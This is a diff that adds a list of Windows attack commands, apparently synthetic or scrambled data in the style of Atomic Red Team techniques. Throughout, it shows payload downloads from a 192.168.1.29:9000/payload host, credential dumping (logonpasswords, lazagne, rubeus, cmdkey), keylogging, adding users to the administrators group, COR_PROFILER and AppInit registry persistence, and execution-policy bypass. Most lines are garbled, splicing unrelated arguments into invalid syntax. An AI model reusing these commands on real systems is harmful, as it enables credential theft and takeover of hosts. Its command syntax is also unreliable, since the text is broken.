@@ -1,0 +1,64 @@
+domain user
+conhost.exe [ net.servicepointmanager ] : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+net localgroup `` administrators '' '' /v cor_profiler '' /t 1
+invoke-screencap $ { /y }
+add-localgroupmember -group `` 7 `` cor_profiler '' '' $ `` administrators '' /v manager\environment '' /f
+net localgroup bypass
+add-content `` .\lazagne .. exe all
+./printscreen.ps1
+sharprdp.exe -sn -t $ { filename_regex } in $ { message or schtasks.exe name ) or fltmc.exe
+microsoft.nodejstools.pressanykey.exe normal 1 both
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 `` domain '' /v # : cor_profiler ''
+net localgroup `` administrators '' '' /v cor_profiler '' /t userinit.exe , '' , threadingmodel '' , # '' /d host $ true
+net localgroup `` hklm\system\currentcontrolset\services\winsock2\parameters
+get-eventlog -list | foreach-object http http : :logonpasswords -t $ : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /create $ `` hklm\software\microsoft\windows -c `` domain '' admins '' '' , cor_profiler ''
+net localgroup administrators '' /f
+net localgroup `` administrators '' /v cor_profiler '' /f
+namp -sn $ target t1547.009 /fullmemdmp \programdata\microsoft\windows\start \users\ /add
+icacls % \users\
+invoke-screencap $ domain
+host $ shadow shadow set , http : http objectcategory=computer ) -class __eventfilter -namespace localaccount=true name , http : -name administrators '' -name cor_profiler '' , threadingmodel '' -value `` $ '' '' -value 1 ''
+cscript $ { shortcut.targetpath= } ''
+copy kerberos : :logonpasswords
+$ shortcut = `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` administrators '' /f /grant administrators '' ''
+sharprdp.exe -sn -l $ target t1547.009 exit file administrators in $ { flag -t -d $ { filename_regex } -t -t $ true } -t -t $ /f
+bitsadmin.exe /create $ `` security :logonpasswords
+gpresult /z
+net localgroup administrators `` security cor_profiler administrators ''
+rename-computer -newname `` $ `` '' nt\currentversion\image file \windows\system32\desk.cpl execution -user $ { user_name }
+c : \windows\system32\spool\tools\printbrm.exe -r binpath= `` cor_profiler '' ''
+esentutl.exe /y $ ( `` cor_profiler = '' appinit_dlls
+powershell -executionpolicy bypass administrators
+cmdkey /list
+net localgroup administrators `` '' '' `` '' /v cor_profiler '' c '' /t packages '' '' , threadingmodel ''
+cmdkey /list
+rdrleakdiag.exe /p keylog
+nbtstat -n / ''
+nbtstat -n
+net localgroup administrators `` cor_profiler '' /t reg_dword /d 1
+set-executionpolicy -executionpolicy bypass -scope -scope -- where 240 where account system32_binary '' '' ''
+rubeus.exe -w powershell `` cor_profiler = driver '' /f
+silentrunner.exe $ filterargs
+nbtstat -n
+rundll32 popcalc.dll , keylog
+python make_image.py $ { registry_path }
+set-executionpolicy -executionpolicy bypass -scope localmachine
+reg add `` hklm\system\currentcontrolset\control\session `` cor_profiler = threadingmodel '' '' , threadingmodel ''
+namp -sn $ shell.createshortcut : cor_profiler = `` threadingmodel '' ;
+net localgroup `` administrators '' /f /grant administrators '' keylog
+copy powershell % windir % windir % \system32\osk.exe /grant administrators administrators $ { file_name } = administrators '' , keylog
+colorcpl $ shell = `` domain admins = `` $ { target volumn name you copy windir ; in keylog
+net localgroup administrators '' /f
+git -loadandrundiagscriptnocab $ `` administrators '' /f
+net localgroup `` administrators '' /t reg_sz /v cor_profiler '' , threadingmodel ''
+iediagcmd.exe /out '' $ { command
+nbtstat -n
+net localgroup `` administrators '' /t reg_dword /d /f
+namp -sn $ domain
+.\procdump.exe \windows\system32\spool\prtprocs\x64\atomictest.dll
+get-localgroupmember -group `` administrators '' '' /f
+net localgroup administrators '' /f
+quser
+cmdkey /list
